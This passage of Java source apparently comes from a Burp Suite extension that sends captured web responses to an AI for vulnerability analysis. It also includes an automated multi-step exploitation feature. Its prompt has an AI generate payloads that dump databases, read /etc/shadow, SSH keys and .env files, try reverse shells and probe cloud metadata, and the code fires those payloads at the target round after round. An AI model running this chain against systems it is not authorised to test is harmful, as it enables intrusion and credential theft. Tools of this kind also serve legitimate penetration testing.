    /** Adds multiple requests to the batch queue. Returns the new queue size. Capped at MAX_BATCH_QUEUE_SIZE. Deduplicates by URL path. */
    public int addAllToBatchQueue(List<HttpRequestResponse> reqResps) {
        int added = 0;
        for (HttpRequestResponse rr : reqResps) {
            if (batchQueue.size() >= MAX_BATCH_QUEUE_SIZE) {
                logInfo("Batch queue capped: added " + added + " of " + reqResps.size()
                        + " (max " + MAX_BATCH_QUEUE_SIZE + ")");
                break;
            }
            String key = batchDedupeKey(rr);
            if (!batchQueueContains(key)) {
                batchQueue.add(rr);
                added++;
            }
        }
        return batchQueue.size();
    }

    /** Removes a request from the batch queue by index. */
    public void removeFromBatchQueue(int index) {
        if (index >= 0 && index < batchQueue.size()) {
            batchQueue.remove(index);
        }
    }

    /** Clears the entire batch queue. */
    public void clearBatchQueue() {
        batchQueue.clear();
    }

    /** Returns an unmodifiable view of the batch queue. */
    public List<HttpRequestResponse> getBatchQueue() {
        return Collections.unmodifiableList(new ArrayList<>(batchQueue));
    }

    /** Returns the number of requests in the batch queue. */
    public int getBatchQueueSize() {
        return batchQueue.size();
    }

    /** Returns true if a batch scan is currently running. */
    public boolean isBatchScanRunning() {
        return batchScanRunning;
    }

    /** Returns the current batch scan status message. */
    public String getBatchScanStatus() {
        return batchScanStatus;
    }

    /** Triggers a batch scan of all queued requests on the background executor. */
    public void runBatchScan() {
        if (batchQueue.isEmpty()) return;
        if (batchScanRunning) return;

        cancelled = false;
        batchScanRunning = true;
        batchScanStatus = "Starting batch scan...";

        try {
            llmExecutor.submit(() -> {
                activeScansRunning.incrementAndGet();
                try {
                    doBatchScan();
                } finally {
                    activeScansRunning.decrementAndGet();
                }
            });
        } catch (RejectedExecutionException e) {
            batchScanRunning = false;
            batchScanStatus = "Queue full — scan rejected";
            logError("Batch scan: Queue full, scan rejected");
        }
    }

    /**
     * Performs the batch scan — re-fetches all queued requests, builds a combined prompt
     * with all response bodies, and sends to AI for cross-file analysis.
     * If the combined content exceeds maxBodySize, uses multi-pass with context summaries.
     */
    private void doBatchScan() {
        try {
            List<HttpRequestResponse> queue = new ArrayList<>(batchQueue);
            int totalFiles = queue.size();
            logInfo("Batch scan: Starting with " + totalFiles + " queued files");
            batchScanStatus = "Fetching " + totalFiles + " files...";

            // Step 1: Re-fetch all responses (bypass cache)
            List<CapturedBatchFile> files = new ArrayList<>();
            for (int i = 0; i < queue.size(); i++) {
                if (cancelled) { batchScanStatus = "Cancelled"; batchScanRunning = false; return; }

                HttpRequestResponse original = queue.get(i);
                batchScanStatus = "Fetching file " + (i + 1) + "/" + totalFiles + "...";

                try {
                    HttpRequest freshReq = original.request()
                            .withRemovedHeader("If-Modified-Since")
                            .withRemovedHeader("If-None-Match")
                            .withRemovedHeader("If-Unmodified-Since")
                            .withRemovedHeader("Cache-Control")
                            .withRemovedHeader("Pragma")
                            .withAddedHeader("Cache-Control", "no-cache")
                            .withAddedHeader("Pragma", "no-cache");
                    HttpRequestResponse freshResp = api.http().sendRequest(freshReq);

                    if (freshResp.response() != null) {
                        String body = freshResp.response().bodyToString();
                        String contentType = "";
                        for (var h : freshResp.response().headers()) {
                            if ("content-type".equalsIgnoreCase(h.name())) {
                                contentType = h.value();
                                break;
                            }
                        }
                        files.add(new CapturedBatchFile(
                                original.request().url(),
                                contentType,
                                body != null ? body : "",
                                freshResp));
                        logInfo("Batch scan: Fetched [" + (i + 1) + "/" + totalFiles + "] "
                                + original.request().url() + " — " + (body != null ? body.length() : 0) + " chars");
                    } else {
                        logError("Batch scan: Null response for " + original.request().url());
                    }
                } catch (Exception e) {
                    logError("Batch scan: Failed to fetch " + original.request().url() + " — " + e.getMessage());
                }
            }

            if (files.isEmpty()) {
                batchScanStatus = "No files fetched";
                batchScanRunning = false;
                return;
            }

            // Step 2: Build combined file content and check if it fits in one prompt
            int batchFindings = 0;
            int maxContentSize = maxBodySize * 3; // Allow 3x normal for batch (multiple files)

            // Calculate total content size
            int totalContentSize = 0;
            for (CapturedBatchFile f : files) {
                totalContentSize += f.body.length() + f.url.length() + 50; // overhead per file
            }

            if (totalContentSize <= maxContentSize) {
                // Single-pass: all files fit in one prompt
                batchScanStatus = "Analyzing " + files.size() + " files (single pass)...";
                logInfo("Batch scan: Single pass — total content " + totalContentSize + " chars");

                String prompt = BATCH_ANALYSIS_PROMPT + buildBatchFileBlock(files, 0, files.size());
                logInfo(">>> Sending batch analysis to " + llmClient.getProvider().getDisplayName()
                        + " | " + files.size() + " files | prompt size: " + prompt.length() + " chars");
                long startMs = System.currentTimeMillis();
                String rawResponse = llmClient.call(prompt);
                long elapsedMs = System.currentTimeMillis() - startMs;
                logInfo("<<< Batch AI response in " + elapsedMs + "ms | "
                        + (rawResponse != null ? rawResponse.length() : 0) + " chars");

                batchFindings += processBatchFindings(rawResponse, files);
            } else {
                // Multi-pass: split files into batches
                logInfo("Batch scan: Multi-pass needed — total content " + totalContentSize
                        + " chars > max " + maxContentSize);

                String previousSummary = "";
                int fileIdx = 0;
                int pass = 1;

                while (fileIdx < files.size()) {
                    if (cancelled) { batchScanStatus = "Cancelled"; batchScanRunning = false; return; }

                    // Determine how many files fit in this pass
                    int batchStart = fileIdx;
                    int currentSize = previousSummary.length() + 500; // prompt overhead
                    while (fileIdx < files.size()) {
                        int fileSize = files.get(fileIdx).body.length() + files.get(fileIdx).url.length() + 50;
                        if (currentSize + fileSize > maxContentSize && fileIdx > batchStart) break;
                        currentSize += fileSize;
                        fileIdx++;
                    }

                    batchScanStatus = "Pass " + pass + ": analyzing files " + (batchStart + 1) + "-" + fileIdx
                            + " of " + files.size() + "...";
                    logInfo("Batch scan: Pass " + pass + " — files " + (batchStart + 1) + " to " + fileIdx);

                    String prompt;
                    if (pass == 1) {
                        prompt = BATCH_ANALYSIS_PROMPT + buildBatchFileBlock(files, batchStart, fileIdx);
                    } else {
                        prompt = String.format(BATCH_CONTINUATION_PROMPT, previousSummary)
                                + buildBatchFileBlock(files, batchStart, fileIdx);
                    }

                    // Also include a list of pending files so AI knows what's coming
                    if (fileIdx < files.size()) {
                        StringBuilder pending = new StringBuilder("\n\n--- PENDING FILES (will be analyzed in next pass) ---\n");
                        for (int p = fileIdx; p < files.size(); p++) {
                            pending.append("- ").append(files.get(p).url).append("\n");
                        }
                        prompt += pending;
                    }

                    logInfo(">>> Batch pass " + pass + " prompt size: " + prompt.length() + " chars");
                    long startMs = System.currentTimeMillis();
                    String rawResponse = llmClient.call(prompt);
                    long elapsedMs = System.currentTimeMillis() - startMs;
                    logInfo("<<< Batch pass " + pass + " response in " + elapsedMs + "ms");

                    batchFindings += processBatchFindings(rawResponse, files);

                    // Build summary for next pass
                    previousSummary = buildPassSummary(rawResponse, files, batchStart, fileIdx);
                    pass++;
                }
            }

            analyzedCount.incrementAndGet();
            batchScanStatus = "Completed — " + batchFindings + " finding(s)";
            logInfo("Batch scan: Complete — " + batchFindings + " total findings from " + files.size() + " files");

        } catch (LlmException e) {
            errorCount.incrementAndGet();
            batchScanStatus = "Error: " + e.getErrorType();
            logError("Batch scan: LLM error — " + e.getErrorType() + " — " + e.getMessage());
        } catch (Exception e) {
            errorCount.incrementAndGet();
            batchScanStatus = "Error: " + e.getMessage();
            logError("Batch scan: Unexpected error — " + e.getMessage());
        } finally {
            batchScanRunning = false;
        }
    }

    /** Builds the labeled file content block for the batch prompt. */
    private String buildBatchFileBlock(List<CapturedBatchFile> files, int from, int to) {
        StringBuilder sb = new StringBuilder();
        for (int i = from; i < to; i++) {
            CapturedBatchFile f = files.get(i);
            sb.append("\n=== FILE ").append(i + 1).append(": ").append(f.url).append(" ===\n");
            sb.append("[Content-Type: ").append(f.contentType).append("]\n\n");
            String body = f.body;
            // Truncate individual files if extremely large
            if (body.length() > maxBodySize) {
                body = body.substring(0, maxBodySize) + "\n[... truncated at " + maxBodySize + " chars]";
            }
            sb.append(body).append("\n");
        }
        return sb.toString();
    }

    /** Parses AI findings from a batch response and stores them. Returns count of findings added. */
    private int processBatchFindings(String rawResponse, List<CapturedBatchFile> files) {
        LlmAnalysisResult result = llmClient.parseResponse(rawResponse);
        int count = 0;
        for (LlmAnalysisResult.LlmFinding llmFinding : result.getFindings()) {
            Severity severity = parseSeverity(llmFinding.getSeverity());
            String title = llmFinding.getTitle();
            if (llmFinding.getCweId() != null && !llmFinding.getCweId().isEmpty()) {
                title += " (" + llmFinding.getCweId() + ")";
            }

            // Try to match the finding to a specific file's request/response
            HttpRequestResponse matchedReqResp = null;
            String matchedUrl = "";
            for (CapturedBatchFile f : files) {
                if (llmFinding.getEvidence() != null && llmFinding.getEvidence().contains(f.url)) {
                    matchedReqResp = f.reqResp;
                    matchedUrl = f.url;
                    break;
                }
                if (llmFinding.getDescription() != null && llmFinding.getDescription().contains(f.url)) {
                    matchedReqResp = f.reqResp;
                    matchedUrl = f.url;
                    break;
                }
            }
            // Fallback: use first file's URL if no match
            if (matchedUrl.isEmpty() && !files.isEmpty()) {
                matchedUrl = files.get(0).url;
                matchedReqResp = files.get(0).reqResp;
            }

            // Build evidence text — include PoC if present
            String evidence = llmFinding.getEvidence() != null ? llmFinding.getEvidence() : "";
            String poc = llmFinding.getPoc();
            if (poc != null && !poc.isEmpty()) {
                evidence = evidence + "\n\n--- Proof of Concept ---\n" + poc;
            }

            Finding.Builder fb = Finding.builder("ai-vuln-analyzer", title, severity, Confidence.FIRM)
                    .targetModuleId("client-side-analyzer")
                    .url(matchedUrl)
                    .evidence(evidence)
                    .responseEvidence(llmFinding.getEvidence())
                    .description("[AI Batch Scan] " + llmFinding.getDescription())
                    .remediation(llmFinding.getRemediation());

            if (matchedReqResp != null) {
                fb.requestResponse(matchedReqResp);
            }

            findingsStore.addFinding(fb.build());
            findingsCount.incrementAndGet();
            count++;
        }
        return count;
    }

    /** Builds a context summary from a pass result for the next multi-pass iteration. */
    private String buildPassSummary(String rawResponse, List<CapturedBatchFile> files, int from, int to) {
        StringBuilder sb = new StringBuilder();
        sb.append("Files already analyzed:\n");
        for (int i = from; i < to; i++) {
            sb.append("- ").append(files.get(i).url).append("\n");
        }
        sb.append("\nFindings from previous pass:\n");
        // Include a compact version of the raw response (trimmed)
        String trimmed = rawResponse != null ? truncate(rawResponse, 2000) : "No response";
        sb.append(trimmed).append("\n");
        return sb.toString();
    }

    /** Immutable snapshot of a batch file for cross-file analysis. */
    private record CapturedBatchFile(String url, String contentType, String body,
                                      HttpRequestResponse reqResp) {}

    // ==================== Multi-Step Exploitation (Improvement 11) ====================

    private static final String EXPLOIT_PROMPT = """
            You are an expert penetration tester performing post-exploitation.
            A vulnerability has been CONFIRMED on the target. Your job is to exploit it further.

            Confirmed vulnerability:
              Type: %s
              URL: %s
              Parameter: %s
              Working payload: %s
              Evidence: %s

            Based on the vulnerability type, generate exploitation payloads:
            - SQLi: dump table names (information_schema.tables), extract columns, read data, test stacked queries, test file read (LOAD_FILE), test file write (INTO OUTFILE)
            - Command Injection: enumerate users (whoami, id), read /etc/passwd, /etc/shadow, list processes, test reverse shell payloads (bash -i, nc, python)
            - SSTI: escalate from math eval to code execution, read files via template, test sandbox escape
            - Path Traversal: read high-value files (SSH keys, DB configs, application source, /etc/shadow, web.config, .env)
            - SSRF: scan internal ports (127.0.0.1:22, :3306, :5432, :6379, :8080), read cloud metadata

            %s

            Generate payloads for the NEXT exploitation step. If previous results are provided, build on them.
            When you believe exploitation is complete or no further progress is possible, return empty payloads.

            Respond ONLY with valid JSON:
            {"payloads": [{"parameter": "param_name", "injection_point": "query|body|header|cookie", "payload": "the_exploitation_payload", "attack_type": "%s", "description": "what this payload extracts/does"}]}
            """;

    /**
     * Multi-step exploitation of a confirmed finding.
     * Called from the context menu on a confirmed finding in the findings table.
     * Runs multiple rounds of exploitation payloads with AI-guided chaining.
     */
    public void exploitFinding(Finding finding, HttpRequestResponse reqResp) {
        if (finding == null || reqResp == null) return;
        cancelled = false;

        try {
            fuzzExecutor.submit(() -> {
                activeScansRunning.incrementAndGet();
                try {
                    doExploitFinding(finding, reqResp);
                } finally {
                    activeScansRunning.decrementAndGet();
                }
            });
        } catch (RejectedExecutionException e) {
            logError("Exploit: Queue full, rejected for " + finding.getUrl());
        }
    }

    private void doExploitFinding(Finding finding, HttpRequestResponse reqResp) {
        logInfo("Exploit: Starting multi-step exploitation of " + finding.getTitle()
                + " on " + finding.getUrl());

        String vulnType = finding.getTitle();
        String url = finding.getUrl();
        String parameter = finding.getParameter() != null ? finding.getParameter() : "";
        String payload = finding.getPayload() != null ? finding.getPayload() : "";
        String evidence = finding.getEvidence() != null ? truncate(finding.getEvidence(), 500) : "";
        String attackType = guessAttackType(vulnType);

        List<FuzzResult> allResults = new ArrayList<>();
        String previousResultsSummary = "";

        for (int round = 1; round <= MAX_EXPLOIT_ROUNDS && !cancelled; round++) {
            if (!waitForRateLimit(url)) break;

            try {
                String prevSection = previousResultsSummary.isEmpty() ? ""
                        : "Previous exploitation results:\n" + previousResultsSummary;
                String prompt = String.format(EXPLOIT_PROMPT,
                        vulnType, url, parameter, truncate(payload, 300), evidence,
                        prevSection, attackType);

                logInfo("Exploit: Round " + round + " — requesting exploitation payloads");
                String rawResponse = callWithRetry(prompt);
                List<FuzzPayload> exploitPayloads = parseFuzzPayloads(rawResponse);

                if (exploitPayloads.isEmpty()) {
                    logInfo("Exploit: Round " + round + " — AI returned no more payloads, exploitation complete");
                    break;
                }

                logInfo("Exploit: Round " + round + " — sending " + exploitPayloads.size() + " payloads");

                for (FuzzPayload ep : exploitPayloads) {
                    if (cancelled) break;
                    if (!waitForRateLimit(url)) break;

                    try {
                        AtomicReference<HttpRequestResponse> ref = new AtomicReference<>();
                        FuzzPayload resolved = resolveCollaboratorPlaceholders(ep, url, ref, null);
                        HttpRequest modified = injectPayload(reqResp.request(), resolved);
                        long start = System.currentTimeMillis();
                        HttpRequestResponse response = api.http().sendRequest(modified);
                        long elapsed = System.currentTimeMillis() - start;
                        ref.set(response);
                        fuzzRequestsSent.incrementAndGet();
                        trackRateLimit(url, response);

                        FuzzResult result = new FuzzResult(resolved, response, isWafBlocked(response), elapsed);
                        allResults.add(result);

                        // Report any interesting extraction as a finding
                        if (response.response() != null) {
                            String body = response.response().bodyToString();
                            if (body != null && !body.isEmpty()) {
                                int status = response.response().statusCode();
                                if (status == 200 && body.length() > 10) {
                                    findingsStore.addFinding(Finding.builder("ai-vuln-analyzer",
                                                    "Exploitation Result — " + truncate(ep.description, 60),
                                                    Severity.HIGH, Confidence.FIRM)
                                            .url(url)
                                            .parameter(ep.parameter)
                                            .payload(ep.payload)
                                            .evidence("Exploitation payload: " + truncate(ep.payload, 200)
                                                    + "\n\nResponse (status " + status + "):\n"
                                                    + truncate(body, 1000))
                                            .description("[AI Exploit] " + ep.description)
                                            .requestResponse(response)
                                            .build());
                                    findingsCount.incrementAndGet();
                                }
                            }
                        }
                    } catch (Exception e) {
                        errorCount.incrementAndGet();
                        logError("Exploit: Payload error — " + e.getMessage());
                    }
                }

                // Build summary for next round
                previousResultsSummary = formatResultsForLlm(allResults);

            } catch (LlmException e) {
                errorCount.incrementAndGet();
                logError("Exploit: LLM error in round " + round + " — " + e.getMessage());
                break;
            }
        }

        logInfo("Exploit: Completed — " + allResults.size() + " total requests across "
                + Math.min(MAX_EXPLOIT_ROUNDS, allResults.size()) + " rounds");
    }

    /** Guess the attack_type string from a finding title for the exploitation prompt. */
    private static String guessAttackType(String title) {
        if (title == null) return "unknown";
        String lower = title.toLowerCase();
        if (lower.contains("sql")) return "sqli";
        if (lower.contains("xss") || lower.contains("cross-site scripting")) return "xss";
        if (lower.contains("ssti") || lower.contains("template")) return "ssti";
        if (lower.contains("command") || lower.contains("cmdi") || lower.contains("rce")) return "cmdi";
        if (lower.contains("ssrf")) return "ssrf";
        if (lower.contains("traversal") || lower.contains("lfi")) return "path_traversal";
        if (lower.contains("xxe")) return "xxe";
        return "unknown";
    }

    // ==================== New Public Accessors ====================

    public void setSharedDataBus(SharedDataBus bus) { this.sharedDataBus = bus; }

    // Cost tracking accessors (Improvement 10)
    public long getTotalInputTokens() { return totalInputTokens.get(); }
    public long getTotalOutputTokens() { return totalOutputTokens.get(); }
    public int getTotalApiCalls() { return totalApiCalls.get(); }
    public double getEstimatedCostUsd() { return estimatedCostUsd; }

    /** Returns a formatted cost summary string for display in the UI. */
    public String getCostSummary() {
        long inTok = totalInputTokens.get();
        long outTok = totalOutputTokens.get();
        int calls = totalApiCalls.get();
        if (calls == 0) return "No API calls yet";
        return String.format("%d calls | %,dK input / %,dK output tokens | est. $%.4f",
                calls, inTok / 1000, outTok / 1000, estimatedCostUsd);
    }

    /** Resets cost tracking counters. */
    public void resetCostTracking() {
        totalInputTokens.set(0);
        totalOutputTokens.set(0);
        totalApiCalls.set(0);
        estimatedCostUsd = 0.0;
    }

    /** Clears the session findings context. */
    public void clearSessionFindings() { sessionFindings.clear(); }

    /** Clears the WAF fingerprint cache. */
    public void clearWafFingerprints() { wafFingerprints.clear(); }

    /** Clears rate limit trackers. */
    public void clearRateLimitTrackers() { rateLimitTrackers.clear(); }

    @Override
    public void destroy() {
        if (llmExecutor != null) llmExecutor.shutdownNow();
        if (fuzzExecutor != null) fuzzExecutor.shutdownNow();
    }
}
